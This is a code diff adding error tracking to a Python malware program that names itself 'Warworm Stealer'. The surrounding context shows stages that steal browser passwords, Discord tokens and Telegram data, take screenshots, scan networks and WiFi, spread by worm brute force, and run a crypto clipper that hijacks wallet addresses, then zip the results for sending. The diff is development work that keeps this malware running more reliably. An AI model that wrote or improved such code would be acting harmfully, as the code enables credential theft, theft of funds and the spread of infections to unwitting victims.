@@ -101,6 +101,37 @@ def encode_image_to_base64(image_path):
         print(f"[!] Image encode error: {e}")
     return None
 
+# ==================== ERROR TRACKING ====================
+ERROR_LOG = []
+
+# Log error to be included in errors.txt 
+def log_error(error_type, message):
+    
+    from datetime import datetime
+    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    entry = f"[{timestamp}] {error_type}: {message}"
+    ERROR_LOG.append(entry)
+    print(f"[!] ERROR: {entry}")
+
+# Save errors.txt to output directory for included in zip 
+def save_errors(output_dir):
+    
+    if ERROR_LOG and output_dir and os.path.exists(output_dir):
+        try:
+            errors_file = os.path.join(output_dir, "errors.txt")
+            with open(errors_file, 'w', encoding='utf-8') as f:
+                f.write("=" * 70 + "\n")
+                f.write("                    WARWORM STEALER - ERROR LOG\n")
+                f.write("=" * 70 + "\n\n")
+                f.write(f"Total Errors: {len(ERROR_LOG)}\n\n")
+                for err in ERROR_LOG:
+                    f.write(err + "\n")
+            print(f"    [+] errors.txt saved ({len(ERROR_LOG)} errors)")
+            return True
+        except Exception as e:
+            print(f"    [!] Failed to save errors.txt: {e}")
+    return False
+
 # ==================== FILE VALIDATION FUNCTIONS ====================
 
 #Validate system_info.txt exists and read it
@@ -1186,6 +1217,7 @@ def run_data_collection():
 
             print("    [+] System info collected")
         except Exception as e:
+            log_error("Collection:SystemInfo", str(e))
             print(f"[!] System info error: {e}")
 
     # 2. Screenshot
@@ -1199,6 +1231,7 @@ def run_data_collection():
             else:
                 print("    [!] Screenshot failed")
         except Exception as e:
+            log_error("Collection:Screenshot", str(e))
             print(f"[!] Screenshot error: {e}")
 
     # 3. Browser Passwords
@@ -1212,6 +1245,7 @@ def run_data_collection():
             else:
                 print("    [*] No passwords found")
         except Exception as e:
+            log_error("Collection:Browser", str(e))
             print(f"[!] Browser password error: {e}")
 
     # 4. Discord Tokens
@@ -1239,6 +1273,7 @@ def run_data_collection():
             else:
                 print("    [*] No Discord tokens found")
         except Exception as e:
+            log_error("Collection:Discord", str(e))
             print(f"[!] Discord token error: {e}")
             import traceback
             traceback.print_exc()
@@ -1250,6 +1285,7 @@ def run_data_collection():
             success, msg = steal_telegram(output_dir)
             print(f"    {'[+] ' if success else '[!] '}{msg}")
         except Exception as e:
+            log_error("Collection:Telegram", str(e))
             print(f"[!] Telegram error: {e}")
 
     # 6. Network Scan (using built-in scanner) - ONLY if auto_brute is OFF
@@ -1259,6 +1295,7 @@ def run_data_collection():
             scan_result = run_network_scan_builtin(output_dir)
             print("    [+] Network scan complete")
         except Exception as e:
+            log_error("Collection:NetworkScan", str(e))
             print(f"[!] Network scan error: {e}")
             import traceback
             traceback.print_exc()
@@ -1271,6 +1308,7 @@ def run_data_collection():
             count = wifi_results.get('total_networks', 0)
             print(f"    [+] Found {count} WiFi networks")
         except Exception as e:
+            log_error("Collection:WiFi", str(e))
             print(f"[!] WiFi error: {e}")
 
     # 8. Worm Network Scan & Brute Force - CRITICAL FIX
@@ -1341,6 +1379,7 @@ def run_data_collection():
                 print("    [!] Network scan returned None - check worm_network module")
                 
         except Exception as e:
+            log_error("Collection:WormNetwork", str(e))
             print(f"[!] Worm network error: {e}")
             import traceback
             traceback.print_exc()
@@ -1417,18 +1456,22 @@ def main():
     try:
         # STEP 1: Start crypto clipper
         if CONFIG["features"].get("crypto_clipper", False):
-            addresses = {k: v for k, v in CONFIG.get("crypto_addresses", {}).items() if v and v.strip()}
-            if addresses:
-                print("[*] Starting Crypto Clipper...")
-                clipper = get_clipper(addresses)
-                if clipper and clipper.start():
-                    keep_alive = True
-                    clipper_running = True
-                    print(f"[+] Clipper started: {len(addresses)} addresses")
+            try:
+                addresses = {k: v for k, v in CONFIG.get("crypto_addresses", {}).items() if v and v.strip()}
+                if addresses:
+                    print("[*] Starting Crypto Clipper...")
+                    clipper = get_clipper(addresses)
+                    if clipper and clipper.start():
+                        keep_alive = True
+                        clipper_running = True
+                        print(f"[+] Clipper started: {len(addresses)} addresses")
+                    else:
+                        print("[!] Failed to start clipper")
                 else:
-                    print("[!] Failed to start clipper")
-            else:
-                print("[!] Clipper enabled but no addresses configured")
+                    print("[!] Clipper enabled but no addresses configured")
+            except Exception as e:
+                log_error("Clipper", str(e))
+                print(f"[!] Clipper error: {e}")
 
         # STEP 2: Data Collection
         print("\n[*] Starting data collection...")
@@ -1445,6 +1488,7 @@ def main():
             report_path, html = generate_html_report(output_dir, clipper_running)
             print(f"    [+] Report saved: {report_path}")
         except Exception as e:
+            log_error("Main:Report", str(e))
             print(f"    [!] Report generation error: {e}")
             import traceback
             traceback.print_exc()
@@ -1454,6 +1498,10 @@ def main():
         try:
             print("[*] Creating archive...")
             zip_path = os.path.join(temp_dir, f"tmpdb_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip")
+
+            # Save errors BEFORE creating zip so it's included
+            save_errors(output_dir)
+            
             with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
                 for root, dirs, files in os.walk(output_dir):
                     for file in files:
@@ -1462,6 +1510,7 @@ def main():
                         zf.write(file_path, arcname)
             print(f"    [+] Archive created: {zip_path}")
         except Exception as e:
+            log_error("Main:Archive", str(e))
             print(f"    [!] Archive error: {e}")
 
         # STEP 5: Send results
@@ -1506,6 +1555,7 @@ def main():
         print("[*] Warworm Stealer completed")
 
     except Exception as e:
+        log_error("Main:Delivery", str(e))
         print(f"\n[!] Fatal error: {e}")
         import traceback
         traceback.print_exc()
